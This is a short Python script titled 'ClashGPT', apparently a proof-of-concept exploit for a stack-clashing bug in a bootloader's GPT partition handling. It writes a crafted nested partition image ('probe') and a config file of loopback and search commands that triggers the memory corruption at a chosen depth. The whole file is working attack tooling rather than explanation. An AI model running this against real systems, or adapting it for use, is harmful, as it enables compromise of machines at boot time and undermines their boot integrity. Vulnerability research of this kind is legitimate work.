"""
                        ClashGPT - bah / January 2025

                    "Show em how to struggle, make magic"
"""
import sys
from gpt import stack
from consts import MAX_DEPTH, BLOCK_SIZE
from util import command, find_root  # , force_regions_to_exist


class Primitive:
    """
    The stack clashing primitive.
    """

    def __init__(self, max_depth=MAX_DEPTH):
        self._max_depth = max_depth

    def setup(self, basepath):
        blocks = stack(self._max_depth, b'A'*512, b'B'*512)
        # padding with one block so we don't trigger the bug automatically with
        # an `ls`
        res = b'b' * BLOCK_SIZE
        res += b''.join(map(bytes, blocks))
        with open(f'{basepath}/probe', 'wb') as f:
            f.write(res)

    def setup_cfg(self):
        return command('loopback base /x/probe')

    def trigger(self, depth):
        """
        Trigger the bug at a given depth.
        """
        assert depth <= self._max_depth
        res = []
        offset = 1 + (self._max_depth - depth) * 3
        res += command(f'loopback probe (base){offset}+')
        res += command('search.file does_not_exist --hint probe')
        res += command('loopback -d probe')
        return res


def main():
    basepath = sys.argv[1]

    prim = Primitive()
    prim.setup(basepath)

    trigger = []
    trigger += find_root('/x/probe', 'root')
    # initial setup things
    trigger += command('set template=aaaabbbbaaaabbbbaaaabbbbaaaabbbb')
    # trigger += command('set debug=gpt')
    trigger += prim.setup_cfg()

    # access from a specific block to hit a specific depth.
    trigger += prim.trigger(64)

    # trigger += force_regions_to_exist()
    # setup the construction
    # trigger += command('set debug=none')
    with open(f'{basepath}/trigger.cfg', 'w') as f:
        f.write('\n'.join(trigger))


if __name__ == "__main__":
    main()
